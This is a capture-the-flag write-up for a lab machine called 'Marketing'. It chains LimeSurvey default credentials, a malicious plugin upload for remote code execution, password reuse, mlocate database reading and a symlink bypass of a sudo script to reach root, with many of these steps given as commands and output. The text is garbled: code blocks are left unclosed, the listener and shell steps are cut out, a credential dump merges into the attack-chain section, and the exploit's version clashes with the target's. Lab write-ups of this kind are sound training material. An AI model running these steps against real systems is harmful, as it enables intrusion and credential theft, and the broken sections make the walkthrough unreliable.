# Marketing — Proving Grounds

> [!abstract] Summary
> Marketing's page source code leaks a subdomain, `customers-survey.marketing.pg`, which hosts **LimeSurvey 5.3.24**. We log in with **default credentials** (`admin`/`password`) and upload a **malicious PHP plugin** for RCE as `www-data`. The LimeSurvey `config.php` reuses a database password that works for `t.miller` (**credential reuse**). From there, membership in the **mlocate group** lets us read `mlocate.db` and discover a private credentials file belonging to `m.sander`. A `sync.sh` script runnable via `sudo` as `m.sander` has a filename filter that can be bypassed with a **symlink**, causing `diff` to dump `m.sander`'s credentials. Finally, `m.sander` is in the **sudo group**, so `sudo su` gives root.

**Target:** `192.168.160.225`

## Methodology

1. Scan all TCP ports; identify SSH (22) and HTTP (80).
2. Enumerate web directories; inspect page source code to discover subdomain `customers-survey.marketing.pg`.
3. Identify LimeSurvey on the subdomain; log in with default credentials (`admin`/`password`).
4. Exploit authenticated LimeSurvey plugin upload RCE to get a shell as `www-data`.
5. Read `config.php` for database credentials; reuse the password to pivot to `t.miller`.
6. Use mlocate group membership to discover `m.sander`'s credentials file path.
7. Bypass `sync.sh` filename filter with a symlink to read `m.sander`'s credentials.
8. Switch to `m.sander`; escalate to root via the sudo group.

## Initial Foothold

### LimeSurvey Authenticated Plugin Upload RCE

LimeSurvey allows administrators to install plugins — which are PHP code the server executes. A malicious plugin can be packaged and uploaded for RCE.

Clone the exploit:
```
git clone https://github.com/TheRedP4nther/limesurvey-6.6.4-authenticated-rce
cd limesurvey-6.6.4-authenticated-rce
```

Install dependencies:
```
pip3 install -r requirements.txt --break-system-packages

Start a listener (the exploit uses Penelope or a netcat listener):

### t.miller → m.sander (mlocate + Symlink Bypass)

Check sudo permissions:
```
sudo -l
User t.miller may run the following commands on marketing:
    (m.sander) /usr/bin/sync.sh
```

Check group memberships:
```
t.miller@marketing:/$ id
uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)
```

`t.miller` is in the `mlocate` group (GID 119), which grants read access to the system-wide locate database — an index of every file path on the system, including those we cannot otherwise list.

```
t.miller@marketing:/$ find / -group mlocate 2>/dev/null
/var/lib/mlocate/mlocate.db
/usr/bin/mlocate
```

Search the mlocate database for files in `m.sander`'s home:
```
cat /var/lib/mlocate/mlocate.db | strings | grep '/home/m.sander/personal' -A 3 -B 3
.bashrc
.profile
personal
/home/m.sander/personal
creds-for-2022.txt
notes.txt
/home/t.miller
```

A promising file: `/home/m.sander/personal/creds-for-2022.txt`. We cannot read it directly (it belongs to `m.sander`), but the `sync.sh` script runs as `m.sander`.

Inspect the script:
```
cat /usr/bin/sync.sh
#!/bin/bash
if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi
note=$1
if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi
difference=$(diff /home/m.sander/personal/notes.txt $note)
if [[ -z $difference ]]; then
    echo "no update"
    exit
fi
echo "Difference: $difference"
cp $note /home/m.sander/personal/notes.txt
echo "[+] Updated."
```

The script runs `diff` between `notes.txt` and the file we supply, printing the difference. This is an arbitrary read — if the supplied file contains text `notes.txt` doesn't have, `diff` outputs it. However, there is a filter: `if [[ "$note" =~ .*m.sander.* ]]` rejects any path containing the string `m.sander`.

Confirm the filter blocks direct access:
```
echo 'ejemplo' > test.txt
sudo -u m.sander /usr/bin/sync.sh test.txt
Difference: 0a1
> ejemplo
[+] Updated.

sudo -u m.sander /usr/bin/sync.sh /home/m.sander/personal/creds-for-2022.txt
error: forbidden
```

**Bypass with a symlink** — create a link whose name does not contain `m.sander`. The script follows the symlink because it runs as `m.sander` (who owns the target file):

```
ln -sf /home/m.sander/personal/creds-for-2022.txt aaa
sudo -u m.sander /usr/bin/sync.sh aaa
Difference: 1c1,8
< ejemplo
---
> slack account:
> michael_sander@gmail.com - pa$$word@123$$4!!
>

## Attack Chain

```
HTTP (80)  --  source code -> subdomain customers-survey.marketing.pg
        │  LimeSurvey with default creds (admin/password)
        │  malicious plugin upload -> RCE
        ▼
www-data
        │  config.php reuses password -> su t.miller
        ▼
t.miller  (local.txt)
        │  mlocate group -> read mlocate.db -> creds-for-2022.txt
        │  sudo (m.sander) sync.sh + symlink -> diff reveals the password
        ▼
m.sander
        │  sudo group -> sudo su
        ▼
root  (proof.txt)
```

## Lessons Learned

1. **The source code hides the real surface.** The root domain gave nothing useful; the subdomain in the HTML source was the entire attack path. Always read page source and fuzz for virtual hosts.

2. **Default credentials and their reuse chain together.** `admin`/`password` opened LimeSurvey, and its database password opened a system user. The same password in different places is the chain's glue.

3. **The mlocate group leaks the entire filesystem tree.** We could not read the file, but we discovered it existed and where. A seemingly harmless group revealed private paths.

4. **A sudo script that follows symlinks is an arbitrary read.** `sync.sh` ran as `m.sander` and its `diff` dumped a file we did not own. Privileged scripts must resolve and validate paths, never follow links blindly.

5. **The sudo group closes the box.** Once on `m.sander`, `sudo su` was all it took. Always check `id` and `sudo -l` on each user — it unlocks every hop.
